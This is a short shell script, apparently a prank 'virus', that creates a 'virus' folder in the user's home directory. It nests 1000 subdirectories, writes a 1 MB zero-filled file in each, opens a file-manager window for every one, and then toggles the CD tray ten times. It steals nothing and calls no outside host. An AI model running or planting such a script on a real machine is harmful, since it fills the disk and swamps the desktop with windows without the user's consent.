#!/bin/sh

export PS1='\e[01;96m>\e[00m'
cd $HOME
mkdir virus
cd virus

i=0
while [ $i -lt 1000 ]; do
	mkdir $i
	cd $i
	dd if=/dev/zero of=$i.virus bs=1M count=1
	i=$[ $i + 1 ]
	nautilus . &
done

i=0
while [ $i -lt 10 ]; do
	eject -T
	i=$[ $i + 1 ]
done
